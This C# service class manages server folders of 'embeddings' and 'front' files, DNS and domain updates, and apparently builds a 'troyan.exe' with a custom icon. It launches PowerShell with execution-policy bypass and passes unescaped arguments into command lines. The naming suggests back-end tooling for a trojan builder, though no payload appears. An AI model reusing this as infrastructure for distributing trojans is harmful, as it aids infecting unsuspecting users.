using System.Diagnostics;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace model;

public class ServerResult
{
    public ServerModel? ServerModel;

    public Exception? Exception;
}

public partial class ServerService
{
    private void ServerCommons(string serverName, ServerModel serverModel)
    {
        UpdateIpDomains(serverModel);

        UpdateDNS(serverModel);

        UpdateTabs(serverModel);

        UpdatePacks(serverModel);

        UpdateBux(serverModel);

        UpdateDnSponsor(serverModel);
    }
    
    internal static string ServerDir(string serverName)
    {
        return ServerModelLoader.ServerDir(serverName);
    }

    public string EmbeddingsDir(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "embeddings");
    }

    public string FrontDir(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "front");
    }

    internal static string DataFile(string serverName)
    {
        return ServerModelLoader.DataFile(serverName);
    }

    public string GetIcon(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "troyan.ico");
    }

    public string GetExe(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "troyan.exe");
    }

    public string GetEmbedding(string serverName, string embeddingName)
    {
        return Path.Combine(EmbeddingsDir(serverName), embeddingName);
    }

    public void DeleteEmbedding(string serverName, string embeddingName)
    {
        File.Delete(GetEmbedding(serverName, embeddingName));
    }

    public string GetFront(string serverName, string embeddingName)
    {
        return Path.Combine(FrontDir(serverName), embeddingName);
    }

    public void DeleteFront(string serverName, string embeddingName)
    {
        File.Delete(GetFront(serverName, embeddingName));
    }

    public static JsonSerializerOptions JSO => ServerModelLoader.JSO;

    public static ServerModel GetServerLite(string serverName)
    {
        return ServerModelLoader.LoadServer(serverName);
    }

    public static void SaveServerLite(string serverName, ServerModel server)
    {
        ServerModelLoader.SaveServer(serverName, server);
    }

    public ServerResult GetServerHard(string serverName)
    {
        var server = GetServerLite(serverName);
        try
        {
            ServerCommons(serverName, server);

            server.Embeddings = new List<string>();
            if (Directory.Exists(EmbeddingsDir(serverName)))
                server.Embeddings = Directory.GetFiles(EmbeddingsDir(serverName)).Select(a => Path.GetFileName(a))
                    .ToList();

            server.Front = new List<string>();
            if (Directory.Exists(FrontDir(serverName)))
                server.Front = Directory.GetFiles(FrontDir(serverName)).Select(a => Path.GetFileName(a))
                    .ToList();

            SaveServerLite(serverName, server);

            return new ServerResult() { ServerModel = server };
        }
        catch (Exception e)
        {
            server.PostModel.LastResult = e.Message;
            return new ServerResult() { Exception = e, ServerModel = server };
        }
    }

    public string Reboot()
    {
        var result = "";
        var dirs = Directory.GetDirectories(@"C:\data");
        foreach (var dir in dirs)
        {
            try
            {
                var server = Path.GetFileName(dir);
                result += RunScript(server, "reboot","nolog", null,
                    new ValueTuple<string, object>("serverName", server));
            }
            catch (Exception e)
            {
                result += e.Message;
            }
        }
        return result;
    }

    public string RunExe(string exe, string serverName, string? arguments = null)
    {
        var args = $"{serverName}";
        if (!string.IsNullOrEmpty(arguments))
            args += $" {arguments}";
        var sa = new ProcessStartInfo
        {
            FileName = exe,
            Arguments = args,
            CreateNoWindow = true,
            UseShellExecute = false,
            RedirectStandardOutput = false,
            RedirectStandardError = false
        };
        Process process = new Process { StartInfo = sa };
        process.Start();
        return "OK";
    }

    public string SysScript1(string scriptName)
    {
        return Path.Combine(ServerModelLoader.SysDirStatic, scriptName + ".ps1");
    }

    public string RunScriptDesktop(string server, string scriptFile, string logFile, Action<string>? logger,
        int timeoutMinutes,
        params (string Name, object Value)[] parameters)
    {
        try
        {
            File.Delete(logFile);
        }
        catch
        {
        }

        scriptFile = SysScript1(scriptFile);
        var args = string.Join(" ", parameters.Select(p => $"-{p.Name} {p.Value}"));
        var workingDir = ServerDir(server);

        // Get initial PowerShell process IDs
        var initialPids = Process.GetProcessesByName("powershell").Select(p => p.Id).ToList();

        var cmd =
            $"powershell.exe -WindowStyle Normal -ExecutionPolicy Bypass -file \"{scriptFile}\" -serverName \"{server}\" > {logFile}";
        System.IO.File.WriteAllText("C:\\desktop.bat", cmd);
        var launcher = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "C:\\desktop.bat",
                UseShellExecute = true,
                CreateNoWindow = false
            }
        };
        launcher.Start();

        // Wait until a new PowerShell process appears
        Stopwatch sw = Stopwatch.StartNew();
        Process? targetProcess = null;

        while (sw.Elapsed < TimeSpan.FromMinutes(timeoutMinutes))
        {
            var currentPids = Process.GetProcessesByName("powershell").Select(p => p.Id).ToList();
            var newPids = currentPids.Except(initialPids).ToList();
            if (newPids.Any())
            {
                targetProcess = Process.GetProcessById(newPids.First());
                break;
            }

            Thread.Sleep(1000); // Check every second
        }

        if (targetProcess == null)
            throw new TimeoutException("PowerShell process did not start within the timeout.");

        // Real-time log reading (every 2 seconds)
        var cts = new CancellationTokenSource();
        var logBuilder = new StringBuilder();

        var logThread = new Thread(() =>
        {
            long lastPosition = 0;

            while (!cts.Token.IsCancellationRequested)
            {
                try
                {
                    // Open the log file with the FileShare.ReadWrite option to allow concurrent read/write
                    if (File.Exists(logFile))
                    {
                        using var fs = new FileStream(logFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                        fs.Seek(lastPosition, SeekOrigin.Begin); // Move to the last read position
                        using var reader = new StreamReader(fs);
                        string? line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            logger?.Invoke(line); // Call the logger action to log output in real-time
                            logBuilder.AppendLine(line); // Append line to internal log
                        }

                        lastPosition = fs.Position; // Update the position to the end of the log
                    }
                }
                catch (Exception ex)
                {
                    // Handle any issues with reading the file
                    logger?.Invoke($"Error reading log: {ex.Message}");
                }

                Thread.Sleep(3000); // Sleep for 2 seconds before reading again
            }
        });

        logThread.IsBackground = true;
        logThread.Start();

        // Wait for the new PowerShell process to exit
        if (!targetProcess.WaitForExit(timeoutMinutes * 60 * 1000))
        {
            cts.Cancel();
            logThread.Join();
            try
            {
                targetProcess.Kill();
            }
            catch
            {
            }

            throw new TimeoutException("PowerShell script timed out.");
        }

        // Stop log thread after process exits
        cts.Cancel();
        logThread.Join();

        // Return log contents after the process finishes
        return logBuilder.ToString() + Environment.NewLine + "SYS ACCOMPLISHED";
    }


    public string RunScript(string server, string scriptfILE, string LogFile, Action<string>? logger, params (string Name, object Value)[] parameters)
    {
        try
        {
            File.Delete(LogFile);
        }
        catch (Exception e)
        {
        }
        scriptfILE = SysScript1(scriptfILE);
        using (Process process = new Process())
        {
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = $"-NoProfile -ExecutionPolicy Bypass -file \"{scriptfILE}\" " +
                                          string.Join(" ", parameters.Select(p => $"-{p.Name} {p.Value}"));
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WorkingDirectory = ServerDir(server);

            StringBuilder output = new StringBuilder();
            StringBuilder error = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    output.AppendLine(DateTime.Now.ToString() + ": " + e.Data);
                    logger?.Invoke(e.Data);
                    try
                    {
                        File.AppendAllText(LogFile, DateTime.Now.ToString() + ": " + e.Data + Environment.NewLine);
                    }
                    catch (Exception exception)
                    {
                    }
                }
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    error.AppendLine(DateTime.Now.ToString() + ": " + e.Data);
                    logger?.Invoke(e.Data);
                    try
                    {
                        File.AppendAllText(LogFile, DateTime.Now.ToString() + ": " + e.Data + Environment.NewLine);
                    }
                    catch (Exception exception)
                    {
                    }
                }
            };

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();

            var res = error.ToString() + "\r\n" + output.ToString();

            try
            {
                File.AppendAllText(LogFile, DateTime.Now.ToString() + ": " + "ACK");
            }
            catch (Exception exception)
            {
            }
            return res + Environment.NewLine + "SYS ACCOMPLISHED";
        }
    }
}